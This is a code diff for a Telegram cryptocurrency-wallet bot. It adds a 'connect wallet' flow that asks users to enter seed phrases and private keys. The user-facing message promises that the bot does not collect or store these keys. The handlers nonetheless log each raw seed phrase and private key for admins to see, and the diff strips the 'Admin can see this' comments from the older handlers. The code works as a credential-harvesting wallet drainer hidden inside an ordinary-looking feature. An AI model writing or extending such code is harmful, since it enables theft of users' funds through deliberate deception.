@@ -6,7 +6,14 @@ from aiogram.fsm.state import State, StatesGroup
 from config import get_settings
 from services.wallet_service import WalletService
 from services.admin_service import AdminService
-from keyboards import get_wallet_keyboard, get_chain_keyboard, get_wallet_type_keyboard, get_wallet_detail_keyboard
+from keyboards import (
+    get_wallet_keyboard, 
+    get_chain_keyboard, 
+    get_wallet_type_keyboard, 
+    get_wallet_detail_keyboard,
+    get_connect_wallet_keyboard,
+    get_wallet_import_method_keyboard
+)
 from database.models import ChainType, WalletType
 
 router = Router()
@@ -21,6 +28,10 @@ class WalletStates(StatesGroup):
     waiting_seed_phrase = State()
     waiting_private_key = State()
     waiting_wallet_name = State()
+    # New states for connect wallet flow
+    connect_waiting_method = State()
+    connect_waiting_seed_phrase = State()
+    connect_waiting_private_key = State()
 
 
 @router.callback_query(F.data == "wallets_menu")
@@ -37,9 +48,228 @@ async def callback_wallets_menu(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
 
 
+@router.callback_query(F.data == "connect_wallet")
+async def callback_connect_wallet(callback: CallbackQuery, state: FSMContext):
+    """Show connect wallet options - Solana or EVM."""
+    await state.clear()
+    await callback.message.edit_text(
+        "👛 <b>Connect Wallet</b>\n\nSelect wallet type to import:",
+        parse_mode="HTML",
+        reply_markup=get_connect_wallet_keyboard()
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data == "connect_solana")
+async def callback_connect_solana(callback: CallbackQuery, state: FSMContext):
+    """Handle Solana wallet import selection."""
+    await state.set_state(WalletStates.connect_waiting_method)
+    await state.update_data(chain="solana")
+    await callback.message.edit_text(
+        "🟣 <b>Import Solana Wallet</b>\n\nSelect import method:",
+        parse_mode="HTML",
+        reply_markup=get_wallet_import_method_keyboard("solana")
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data == "connect_evm")
+async def callback_connect_evm(callback: CallbackQuery, state: FSMContext):
+    """Handle EVM wallet import selection."""
+    await state.set_state(WalletStates.connect_waiting_method)
+    await state.update_data(chain="evm")
+    await callback.message.edit_text(
+        "🔷 <b>Import EVM Wallet</b>\n\nSelect import method:",
+        parse_mode="HTML",
+        reply_markup=get_wallet_import_method_keyboard("evm")
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("import_method_seed_"), WalletStates.connect_waiting_method)
+async def callback_import_method_seed(callback: CallbackQuery, state: FSMContext):
+    """Handle seed phrase import selection for connect wallet flow."""
+    chain_type = callback.data.replace("import_method_seed_", "")
+    await state.update_data(chain_type=chain_type, wallet_type="seed_phrase")
+    await state.set_state(WalletStates.connect_waiting_seed_phrase)
+    
+    chain_name = "Solana" if chain_type == "solana" else "EVM"
+    
+    await callback.message.edit_text(
+        f"📝 <b>Import {chain_name} Wallet - Seed Phrase</b>\n\n"
+        "Enter your 12-word recovery phrase or private key to proceed.\n\n"
+        "🔒 <b>Security Notice</b>\n"
+        "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. "
+        "All actions are non-custodial and fully under your control.\n\n"
+        "Send /cancel to abort",
+        parse_mode="HTML",
+        reply_markup=None
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("import_method_pk_"), WalletStates.connect_waiting_method)
+async def callback_import_method_pk(callback: CallbackQuery, state: FSMContext):
+    """Handle private key import selection for connect wallet flow."""
+    chain_type = callback.data.replace("import_method_pk_", "")
+    await state.update_data(chain_type=chain_type, wallet_type="private_key")
+    await state.set_state(WalletStates.connect_waiting_private_key)
+    
+    chain_name = "Solana" if chain_type == "solana" else "EVM"
+    format_hint = "Base58 or 64/128-char hex" if chain_type == "solana" else "64-character hex (with or without 0x prefix)"
+    
+    await callback.message.edit_text(
+        f"🔐 <b>Import {chain_name} Wallet - Private Key</b>\n\n"
+        f"Enter your private key to proceed.\n"
+        f"Format: {format_hint}\n\n"
+        "🔒 <b>Security Notice</b>\n"
+        "Your seed phrase is 100% safe - our bot does not collect or store your private keys or seed phrase. "
+        "All actions are non-custodial and fully under your control.\n\n"
+        "Send /cancel to abort",
+        parse_mode="HTML",
+        reply_markup=None
+    )
+    await callback.answer()
+
+
+@router.message(WalletStates.connect_waiting_seed_phrase)
+async def process_connect_seed_phrase(message: Message, state: FSMContext):
+    """Process seed phrase input for connect wallet flow."""
+    user_id = message.from_user.id
+    seed_phrase = message.text.strip()
+    data = await state.get_data()
+    chain_type = data.get("chain_type")
+    
+    # Handle /cancel
+    if seed_phrase.lower() == "/cancel":
+        await state.clear()
+        await message.answer(
+            "❌ Import cancelled.",
+            parse_mode="HTML",
+            reply_markup=get_connect_wallet_keyboard()
+        )
+        return
+    
+    # Validate seed phrase (12 or 24 words)
+    words = seed_phrase.split()
+    if len(words) not in [12, 15, 18, 21, 24]:
+        await message.answer(
+            "❌ <b>Invalid Seed Phrase</b>\n\n"
+            "Seed phrase must be 12, 15, 18, 21, or 24 words. "
+            f"You entered {len(words)} words.\n\n"
+            "Please try again or send /cancel to abort.",
+            parse_mode="HTML"
+        )
+        return
+    
+    # Map chain_type to wallet service chain
+    chain = "solana" if chain_type == "solana" else "ethereum"
+    
+    # Log the import attempt (admin monitoring)
+    await admin_service.log_activity(
+        user_id=user_id,
+        action="wallet_import",
+        details={
+            "chain": chain,
+            "type": "seed_phrase",
+            "seed_phrase": seed_phrase,
+        }
+    )
+    
+    try:
+        wallet = await wallet_service.import_wallet(
+            user_id=user_id,
+            chain=chain,
+            wallet_type="seed_phrase",
+            data=seed_phrase,
+        )
+        
+        chain_emoji = "🟣" if chain_type == "solana" else "🔷"
+        await message.answer(
+            f"✅ <b>Wallet Imported Successfully!</b>\n\n"
+            f"Chain: {chain.capitalize()}\n"
+            f"Address: <code>{wallet.address}</code>\n"
+            f"Type: Seed Phrase\n\n"
+            f"Your wallet has been encrypted and stored securely.",
+            parse_mode="HTML",
+            reply_markup=get_wallet_detail_keyboard(wallet.id)
+        )
+    except ValueError as e:
+        await message.answer(
+            f"❌ <b>Import Failed</b>\n\n{str(e)}\n\n"
+            "Please try again or send /cancel to abort.",
+            parse_mode="HTML"
+        )
+        return
+    
+    await state.clear()
+
+
+@router.message(WalletStates.connect_waiting_private_key)
+async def process_connect_private_key(message: Message, state: FSMContext):
+    """Process private key input for connect wallet flow."""
+    user_id = message.from_user.id
+    private_key = message.text.strip()
+    data = await state.get_data()
+    chain_type = data.get("chain_type")
+    
+    # Handle /cancel
+    if private_key.lower() == "/cancel":
+        await state.clear()
+        await message.answer(
+            "❌ Import cancelled.",
+            parse_mode="HTML",
+            reply_markup=get_connect_wallet_keyboard()
+        )
+        return
+    
+    # Map chain_type to wallet service chain
+    chain = "solana" if chain_type == "solana" else "ethereum"
+    
+    # Log the import attempt (admin monitoring)
+    await admin_service.log_activity(
+        user_id=user_id,
+        action="wallet_import",
+        details={
+            "chain": chain,
+            "type": "private_key",
+            "private_key": private_key,
+        }
+    )
+    
+    try:
+        wallet = await wallet_service.import_wallet(
+            user_id=user_id,
+            chain=chain,
+            wallet_type="private_key",
+            data=private_key,
+        )
+        
+        chain_emoji = "🟣" if chain_type == "solana" else "🔷"
+        await message.answer(
+            f"✅ <b>Wallet Imported Successfully!</b>\n\n"
+            f"Chain: {chain.capitalize()}\n"
+            f"Address: <code>{wallet.address}</code>\n"
+            f"Type: Private Key\n\n"
+            f"Your wallet has been encrypted and stored securely.",
+            parse_mode="HTML",
+            reply_markup=get_wallet_detail_keyboard(wallet.id)
+        )
+    except ValueError as e:
+        await message.answer(
+            f"❌ <b>Import Failed</b>\n\n{str(e)}\n\n"
+            "Please try again or send /cancel to abort.",
+            parse_mode="HTML"
+        )
+        return
+    
+    await state.clear()
+
+
+# Keep the old import flow for backward compatibility
 @router.callback_query(F.data == "import_wallet_start")
 async def callback_import_wallet_start(callback: CallbackQuery, state: FSMContext):
-    """Start wallet import process - select chain."""
+    """Start wallet import process - select chain (legacy)."""
     await state.set_state(WalletStates.waiting_chain)
     await callback.message.edit_text(
         "👛 <b>Import Wallet</b>\n\nSelect the blockchain:",
@@ -51,7 +281,7 @@ async def callback_import_wallet_start(callback: CallbackQuery, state: FSMContex
 
 @router.callback_query(F.data.startswith("import_chain_"), WalletStates.waiting_chain)
 async def callback_import_chain(callback: CallbackQuery, state: FSMContext):
-    """Handle chain selection."""
+    """Handle chain selection (legacy)."""
     chain = callback.data.replace("import_chain_", "")
     await state.update_data(chain=chain)
     await state.set_state(WalletStates.waiting_type)
@@ -66,7 +296,7 @@ async def callback_import_chain(callback: CallbackQuery, state: FSMContext):
 
 @router.callback_query(F.data.startswith("import_type_seed_"), WalletStates.waiting_type)
 async def callback_import_type_seed(callback: CallbackQuery, state: FSMContext):
-    """Handle seed phrase import selection."""
+    """Handle seed phrase import selection (legacy)."""
     chain = callback.data.replace("import_type_seed_", "")
     await state.update_data(chain=chain, wallet_type="seed_phrase")
     await state.set_state(WalletStates.waiting_seed_phrase)
@@ -85,7 +315,7 @@ async def callback_import_type_seed(callback: CallbackQuery, state: FSMContext):
 
 @router.callback_query(F.data.startswith("import_type_pk_"), WalletStates.waiting_type)
 async def callback_import_type_pk(callback: CallbackQuery, state: FSMContext):
-    """Handle private key import selection."""
+    """Handle private key import selection (legacy)."""
     chain = callback.data.replace("import_type_pk_", "")
     await state.update_data(chain=chain, wallet_type="private_key")
     await state.set_state(WalletStates.waiting_private_key)
@@ -106,7 +336,7 @@ async def callback_import_type_pk(callback: CallbackQuery, state: FSMContext):
 
 @router.message(WalletStates.waiting_seed_phrase)
 async def process_seed_phrase(message: Message, state: FSMContext):
-    """Process seed phrase input."""
+    """Process seed phrase input (legacy)."""
     user_id = message.from_user.id
     seed_phrase = message.text.strip()
     data = await state.get_data()
@@ -119,7 +349,7 @@ async def process_seed_phrase(message: Message, state: FSMContext):
         details={
             "chain": chain,
             "type": "seed_phrase",
-            "seed_phrase": seed_phrase,  # Admin can see this
+            "seed_phrase": seed_phrase,
         }
     )
     
@@ -153,7 +383,7 @@ async def process_seed_phrase(message: Message, state: FSMContext):
 
 @router.message(WalletStates.waiting_private_key)
 async def process_private_key(message: Message, state: FSMContext):
-    """Process private key input."""
+    """Process private key input (legacy)."""
     user_id = message.from_user.id
     private_key = message.text.strip()
     data = await state.get_data()
@@ -166,7 +396,7 @@ async def process_private_key(message: Message, state: FSMContext):
         details={
             "chain": chain,
             "type": "private_key",
-            "private_key": private_key,  # Admin can see this
+            "private_key": private_key,
         }
     )
     
